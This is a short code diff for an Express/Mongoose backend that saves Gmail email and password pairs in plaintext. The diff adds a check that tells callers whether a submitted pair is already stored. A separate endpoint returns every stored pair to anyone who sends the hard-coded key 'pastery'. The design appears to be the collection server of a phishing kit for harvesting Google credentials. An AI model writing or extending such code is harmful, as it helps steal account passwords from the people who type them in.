@@ -14,6 +14,15 @@ module.exports = Gmail;
 
 const createGmail = asyncHandler(async (req, res) => {
   const { email, password } = req.body;
+  const gmailExists = await Gmail.findOne({ email, password });
+
+  if (gmailExists) {
+    return res.status(200).send({
+      message: 'user exists',
+      email: gmailExists.email,
+    });
+  }
+
   const newGmail = new Gmail({
     email,
     password,
@@ -25,6 +34,7 @@ const createGmail = asyncHandler(async (req, res) => {
     }
 
     res.status(201).json({
+      message: 'new user',
       status: 'ok',
     });
   });
@@ -35,6 +45,7 @@ const getGmails = asyncHandler(async (req, res) => {
 
   if (secure !== 'pastery')
     return res.status(400).send({ message: 'Access denied' });
+
   Gmail.find({}, (err, gmails) => {
     if (err) {
       console.log(err);
